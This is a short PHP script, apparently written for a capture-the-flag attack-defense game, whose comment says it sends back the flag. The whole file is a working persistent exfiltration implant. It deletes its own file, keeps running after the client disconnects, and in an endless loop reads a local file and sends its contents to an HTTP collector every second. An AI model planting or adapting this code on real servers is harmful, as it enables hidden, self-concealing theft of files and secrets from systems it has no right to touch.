<?php
#光回传flag
unlink($_SERVER['SCRIPT_FILENAME']);
ignore_user_abort(true);
set_time_limit(0);
while (true) {
    $x = file_get_contents('/Users/moxiaoxi/Desktop/1.txt');
	file_get_contents('http://127.0.0.1:20002/test.php?zmkm=qqq&qqq='.$x);
    sleep(1);
}
?>
	